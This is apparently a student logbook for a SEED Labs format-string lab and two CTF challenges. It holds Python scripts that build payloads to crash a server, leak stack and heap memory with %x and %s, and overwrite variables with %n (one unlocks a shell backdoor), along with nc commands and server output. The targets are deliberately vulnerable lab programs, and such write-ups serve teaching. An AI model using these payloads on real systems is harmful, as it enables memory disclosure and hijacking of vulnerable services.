# Week 6 Logbook

#### Preparation Steps

```sh
[11/23/21]seed@VM:~/.../server-code$ make
...
[11/23/21]seed@VM:~/.../server-code$ make install
...
[11/23/21]seed@VM:~/.../Labsetup$ dcbuild
...
[11/23/21]seed@VM:~/.../Labsetup$ dcup
...
```

## Task 1

#### Code: `build_string_task1.py`
```python
#!/usr/bin/python3
import sys

N = 1500

content = ("%s"*((N//2) - 1)).encode('latin-1')

content = content + bytearray(0x0 for i in range(N - len(content)))

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
[11/23/21]seed@VM:~/.../attack-code$ cat badfile | nc 10.9.0.5 9090
[11/23/21]seed@VM:~/.../attack-code$ 
```

We crafted a format string filled with `%s` format specifiers. This will make the program treat values on the stack as addresses where a string is stored, it is highly likely that we will read from an illegal address and crash the program.

#### Container shell output
```sh
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd560
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd488
server-10.9.0.5 | The target variable's value (before): 0x11223344
```
The *Returned properly* message is not printed, meaning we managed to crash the `format` program.

## Task 2
### Task 2.A
* How many `%x` format specifiers do you need so you can get the server program to print out the first four bytes of your input?
    * 64. We placed a special 4-byte sequence (`0xccaaddee`) at the start of our string and read from the stack until we encountered this sequence.

#### Code: `build_string_task2a.py`
```python
#!/usr/bin/python3
import sys

N = 1500
NUM_BYTES = 4
NUM_MEM_POSITIONS = 64

content = \
    (0xccaaddee).to_bytes(NUM_BYTES,byteorder='little') + \
    ("%x"*NUM_MEM_POSITIONS).encode('latin-1')

content = content + bytearray(0x0 for i in range(N - len(content)))

with open('badfile', 'wb') as f:
  f.write(content)
```

#### Container shell output
```sh
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd570
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd498
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | �ݪ�
server-10.9.0.5 | 11223344 
server-10.9.0.5 | 1000
...
server-10.9.0.5 | 0 
server-10.9.0.5 | 5dc 
server-10.9.0.5 | ccaaddee The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 2.B
* Can you print out the secret message (stored in the heap area)?
    * Yes. We replace our initial 4-byte sequence with the secret message's address given in the server output (`0x080b4008`) and replace the last format specifier with `%s`, so that `printf` will interpret it as an address for a string.

#### Code: `build_string_task2b.py`
```python
#!/usr/bin/python3
import sys

N = 1500
NUM_BYTES = 4
NUM_MEM_POSITIONS = 63

content = \
    (0x080b4008).to_bytes(NUM_BYTES,byteorder='little') + \
    ( \
        "%x"*NUM_MEM_POSITIONS + \
        "\n%s\n" \
    ).encode('latin-1')

content = content + bytearray(0x0 for i in range(N - len(content)))

with open('badfile', 'wb') as f:
  f.write(content)
```

#### Container shell output
```sh
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd3a0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd2c8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 1122334410008049db580e532080e61c0ffffd3a0ffffd2c880e62d480e5000ffffd3688049f7effffd3a00648049f4780e53205dc5dcffffd3a0ffffd3a080e972000000000000000000000000008e2a340080e500080e5000ffffd9888049effffffd3a05dc5dc80e5320000ffffda540005dc
server-10.9.0.5 | A secret message
server-10.9.0.5 | 
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Task 3
### Task 3.A
* Can you change the content of the `target` variable to something else?
    * Yes, we include the address of the target variable (`0x080e5068`) as the first 4 bytes of our format string and use the `%n` format specifier, which will write the number of characters printed by `printf` so far to that address. The server output confirms that we successfully modified the value of the variable.

#### Code: `build_string_task3a.py`
```python
#!/usr/bin/python3
import sys

N = 1500
NUM_BYTES = 4
NUM_MEM_POSITIONS = 63

content = \
    (0x080e5068).to_bytes(NUM_BYTES,byteorder='little') + \
    ( \
        "%x"*NUM_MEM_POSITIONS + \
        "%n" + \
        "\n"
    ).encode('latin-1')

content = content + bytearray(0x0 for i in range(N - len(content)))

with open('badfile', 'wb') as f:
  f.write(content)
```

#### Container shell output
```sh
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd810
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd738
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h1122334410008049db580e532080e61c0ffffd810ffffd73880e62d480e5000ffffd7d88049f7effffd8100648049f4780e53205dc5dcffffd810ffffd81080e97200000000000000000000000000ea13f30080e500080e5000ffffddf88049effffffd8105dc5dc80e5320000ffffdec40005dcThe target variable's value (after):  0x000000ec
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 3.B
* Can you change the change the content of the `target` variable to the value `0x5000`?
    * Yes, by skipping the required number of memory positions (skip 63 memory addresses and write the 64th address), and by making the first 62 memory print a known amount of padding each (8 in our case), we can then do the math to make the 63rd memory read to have a specific amount of padding so that we print exactly 0x5000 characters before writing to the target address using `%n`.T

```python
#!/usr/bin/python3
import sys

N = 1500
NUM_BYTES = 4
PADDING = 8
NUM_MEM_POSITIONS = 62

content = \
    (0x080e5068).to_bytes(NUM_BYTES,byteorder='little') + \
    ( \
        f"%{PADDING}x"*NUM_MEM_POSITIONS + \
        f"%{0x5000 - PADDING*NUM_MEM_POSITIONS - NUM_BYTES}x" + \
        "%n" + \
        "\n"
    ).encode('latin-1')

content = content + bytearray(0x0 for i in range(N - len(content)))

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd420
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd348
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h11223344    1000 8049db5 80e5320 80e61c0ffffd420ffffd348 [...]
server-10.9.0.5 | The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)

## CTF - Task 1

**Output of `checksec`**
```sh
[11/27/21]seed@VM:~/.../Semana6-Desafio1$ checksec program
[*] '/home/seed/labs/ctf6/Semana6-Desafio1/program'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

* What additional protections does the program have? What kinds of attacks are possible?
    * From the ouput of `checksec`, we can conclude that the program has Partial RELRO (Relocation Read-Only), a stack canary and NX (no execute) enabled. The stack canary prevents us from smashing the stack unless we can somehow guess or make the program leak this value. NX prevents us from executing custom shellcode that we have stored in the stack. However, we may still be able to exploit format string vulnerabilities.
* Where is the vulnerability?
    * Line 27 (`printf(buffer)`) contains a format string vulnerability, since the contents of `buffer`, obtained as user input in line 25, will be interpreted as a format string. Since `scanf` only reads 32 characters, our malicious format string will be limited to 32 bytes.
* What can you do with this vulnerability?
    * By exploiting this vulnerability we can print the contents of a variable from the stack, for example the flag. We can achieve this by crafting a special format string to use as the program's input.
* What is the functionality that allows you to obtain the flag?
    * We can place the flag address (`0x0804C060`, obtained using `gdb`) at the start of our payload and then place a `%s` specifier, such that `printf` will interpret the address we placed at the beginning (the flag address) as a string to be read, thus printing the flag.

**`create_payload.py`**
```py
#!/usr/bin/python3
import sys

NUM_BYTES = 4

FLAG_ADDRESS = 0x804c060

content = \
    FLAG_ADDRESS.to_bytes(NUM_BYTES,byteorder='little') + \
    "%s".encode('latin-1')

with open('badfile', 'wb') as f:
  f.write(content)
```

## CTF - Task 2

**Output of `checksec`**
```sh
[11/30/21]seed@VM:~/.../Semana6-Desafio2$ checksec program
[*] '/home/seed/labs/ctf6/Semana6-Desafio2/program'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The ouput of `checksec` shows that this binary has the same security methods active as the program from Task 1.

* Where is the vulnerability? What can you do with this vulnerability?
    * Line 14 (`printf(buffer)`) contains another format string vulnerability, which we can still exploit through user input (which, in this case, is obtained in line 12: `scanf("%32s", &buffer)`).
* Is the flag loaded into memory? Or is there another functionality that you can use to access it?
    * No, the flag is not loaded into memory. Instead, the program has a backdoor which, if activated, gives us access to a shell, which will then allow us to navigate the server file system and print the contents of the flag.
* What do you need to do to unlock that functionality?
    * We need to modify the `key` global variable to be equal to `0xbeef` (48879 in decimal) in order to gain access to the backdoor.
    * To do this, we placed an arbitrary 4-byte value at the start of the payload, followed by the address of the `key` variable (discovered using `gdb`). We use the padding functionality of format strings to make `printf` print a total of 48879 characters and then use the `%n` format to write the number of characters printed so far to the `key` variable.

```py
#!/usr/bin/python3
import sys

NUM_BYTES = 4

KEY_ADDRESS = 0x0804c034

content = \
    (0xdeadbeef).to_bytes(NUM_BYTES,byteorder='little') + \
    KEY_ADDRESS.to_bytes(NUM_BYTES,byteorder='little') + \
    f"%{0xbeef - 8}x".encode('latin-1') + \
    "%n".encode('latin-1')

with open('badfile', 'wb') as f:
  f.write(content)
```
